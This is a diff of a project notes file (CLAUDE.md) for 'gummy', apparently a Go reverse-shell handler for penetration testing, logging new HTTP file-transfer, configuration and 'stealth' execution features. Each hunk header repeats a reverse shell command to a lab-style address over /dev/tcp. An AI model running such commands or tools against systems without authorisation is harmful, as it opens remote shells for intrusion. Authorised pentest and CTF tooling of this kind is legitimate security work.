@@ -62,7 +62,7 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
 
 ### ✅ Completed (Phase 1, 2, 3 & 4 - Core + Advanced + Automation + Windows Support)
 
-**Latest Update (2025-10-17):** Windows PowerShell shells now fully supported with readline mode!
+**Latest Update (2025-10-19):** HTTP-based file transfers + binbag integration complete! Upload/download now blazing fast!
 - [x] Project structure setup
 - [x] TCP listener implementation (`internal/listener.go`)
 - [x] Session Manager with goroutines and channels (`internal/session.go`)
@@ -73,15 +73,17 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Multiple shell detection (bash, sh, python)
   - Terminal size configuration
   - Silent operation (no spam)
-- [x] **File Transfer System** (`internal/transfer.go`)
-  - Upload files (local → remote) with base64 encoding
+- [x] **File Transfer System** (`internal/transfer.go`) 🔥
+  - **HTTP Upload (binbag mode)** - ~1 second for large files using Invoke-WebRequest
+  - **SmartUpload** - Auto-selects HTTP or b64 chunks based on binbag config
+  - **Base64 Chunking** - Fallback for when HTTP unavailable (1KB chunks Windows, 32KB Linux)
+  - **Windows PowerShell** - Uses Out-File for reliable binary/script uploads
+  - Upload files (local → remote) with automatic method selection
   - Download files (remote → local) with base64 decoding
-  - Chunked transfer (32KB chunks) for large files
-  - Animated progress spinners with real-time updates
-  - MD5 checksum verification
+  - Animated progress spinners with real-time updates and inactivity timeout
+  - MD5 checksum verification for both methods
   - Automatic cleanup of temporary files
-  - Connection buffer draining (critical for stability)
-  - ESC to cancel transfers
+  - Ctrl+D to cancel transfers (note: consumes first char after transfer - known limitation)
 - [x] **Readline Integration** (`github.com/chzyer/readline`)
   - Arrow keys for cursor movement in menu
   - Up/Down for command history navigation
@@ -175,6 +177,20 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Prioritizes modern terminals (kitty, ghostty, foot)
   - Falls back to traditional terminals
   - Auto-detects available terminal emulator
+- [x] **Configuration System** (`internal/config.go`, `internal/runtime_config.go`) 🔥
+  - TOML-based persistent configuration (`~/.gummy/config.toml`)
+  - Runtime-mutable settings with thread-safe access (sync.RWMutex)
+  - **Binbag integration** - Serve files via HTTP for blazing fast uploads
+  - **Execution mode** - Toggle between "stealth" (in-memory) and "speed" (HTTP)
+  - **Pivot support** - Override HTTP URLs for internal networks
+  - Commands: `config` (show), `config save` (persist), `set <option> <value>` (modify)
+  - Tilde expansion support (`~/Lab/binbag` works!)
+- [x] **HTTP File Server** (`internal/fileserver.go`) 🔥
+  - Lightweight HTTP server serving files from binbag directory
+  - Real-time progress tracking with channel-based notifications
+  - Inactivity timeout (resets on progress, prevents false timeouts)
+  - Automatic cleanup on gummy exit
+  - Format: `http://<listener-ip>:<http-port>/filename`
 - [x] **Windows PowerShell Support** (`internal/shell.go`) 🆕
   - Dual-mode shell handler: PTY mode (raw) for Linux, readline mode for Windows
   - Readline loop using `github.com/peterh/liner` library
@@ -185,7 +201,10 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Platform auto-detection based on prompt patterns (`PS C:\` for Windows)
   - Known limitation: Prompt may briefly disappear when navigating history
 
-### 📋 TODO (Phase 5 - Polish & Windows Modules) - See TODO.md for details
+### 📋 TODO (Phase 5 - Module Optimization & Polish) - See TODO.md for details
+- [ ] **Optimize run modules with binbag** - Use HTTP for faster module downloads
+- [ ] **Module chunking support** - Fallback to b64 chunks when binbag disabled
+- [ ] **In-memory vs disk modes** - Respect execution mode config (stealth/speed)
 - [ ] **Fix Windows whoami detection** - Currently shows "unknown", should extract from command output
 - [ ] **Test Windows in-memory modules** - `run ps1`, `run net`, `run py` need testing
 - [ ] **SIGWINCH handler** - Dynamic terminal resize (currently fixed at connection time)
@@ -199,22 +218,25 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
 
 ```
 gummy/
-├── main.go                      # ✅ Entry point, CLI flags, interface resolution
+├── main.go                      # ✅ Entry point, CLI flags, binbag initialization
 ├── internal/
-│   ├── listener.go              # ✅ TCP listener, connection acceptance (160 LOC)
-│   ├── session.go               # ✅ Multi-session manager, interactive menu (1230 LOC)
-│   ├── shell.go                 # ✅ Shell I/O handler + bidirectional communication (413 LOC)
-│   ├── pty.go                   # ✅ PTY upgrade system (233 LOC)
-│   ├── transfer.go              # ✅ File upload/download with progress (454 LOC)
-│   ├── ssh.go                   # ✅ SSH connection + auto reverse shell (106 LOC)
-│   ├── payloads.go              # ✅ Reverse shell payload generators (91 LOC)
-│   ├── netutil.go               # ✅ Network interface utilities (107 LOC)
-│   ├── modules.go               # ✅ Module system + enum/lse modules (236 LOC) 🆕
-│   ├── downloader.go            # ✅ HTTP downloader with progress (65 LOC) 🆕
-│   ├── terminal.go              # ✅ Terminal opener (modern terminals) (77 LOC) 🆕
+│   ├── listener.go              # ✅ TCP listener, connection acceptance
+│   ├── session.go               # ✅ Multi-session manager, interactive menu (~1900 LOC)
+│   ├── shell.go                 # ✅ Shell I/O handler (PTY + readline modes)
+│   ├── pty.go                   # ✅ PTY upgrade system (Linux)
+│   ├── transfer.go              # ✅ File upload/download (HTTP + b64 chunks) (~900 LOC) 🔥
+│   ├── config.go                # ✅ TOML configuration (binbag, execution, pivot) 🔥
+│   ├── runtime_config.go        # ✅ Thread-safe runtime config (sync.RWMutex) 🔥
+│   ├── fileserver.go            # ✅ HTTP file server with progress tracking 🔥
+│   ├── ssh.go                   # ✅ SSH connection + auto reverse shell
+│   ├── payloads.go              # ✅ Reverse shell payload generators
+│   ├── netutil.go               # ✅ Network interface utilities
+│   ├── modules.go               # ✅ Module system (peas, lse, loot, pspy, etc.)
+│   ├── downloader.go            # ✅ HTTP downloader with progress
+│   ├── terminal.go              # ✅ Terminal opener (modern terminals)
 │   └── ui/
-│       ├── colors.go            # ✅ Color/formatting with Lipgloss + Bubble Tea (417 LOC)
-│       └── spinner.go           # ✅ Animated spinners for long operations (73 LOC)
+│       ├── colors.go            # ✅ Color/formatting with Lipgloss + Bubble Tea
+│       └── spinner.go           # ✅ Animated spinners for long operations
 ├── go.mod
 ├── go.sum
 └── CLAUDE.md                    # This file
